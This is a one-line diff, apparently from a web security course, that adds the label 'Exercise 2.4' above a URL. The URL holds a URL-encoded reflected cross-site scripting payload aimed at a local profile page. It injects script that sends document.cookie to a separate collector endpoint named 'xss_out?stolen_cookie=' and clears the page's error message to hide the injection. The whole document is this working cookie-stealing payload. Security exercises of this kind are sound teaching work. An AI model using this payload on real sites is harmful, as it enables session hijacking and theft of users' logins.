@@ -1,1 +1,2 @@
+Exercise 2.4:
 http://localhost:8080/profile/%3Cscript%3Edocument.write('%3Cimg%20src%3D%22http%3A%2F%2Flocalhost%3A8081%2Fxss_out%3Fstolen_cookie%3D'%2Bdocument.cookie%2B'%22%2F%3E')%3Bdocument.getElementsByClassName('error')[0].innerHTML%3D''%3B%3C%2Fscript%3E
